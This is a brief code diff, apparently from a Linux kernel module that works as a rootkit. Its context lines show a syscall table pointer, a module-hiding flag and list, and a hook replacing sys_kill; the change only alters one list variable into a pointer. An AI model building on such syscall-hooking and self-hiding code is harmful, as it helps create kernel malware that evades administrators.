@@ -15,7 +15,7 @@ int m_num=0;
 void ** sctable ;
 bool hiding = false;
 struct module *current_mod;
-struct list_head temp_module_list;
+struct list_head *temp_module_list;
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
 asmlinkage int m_sys_kill(pid_t pid, int signal) {
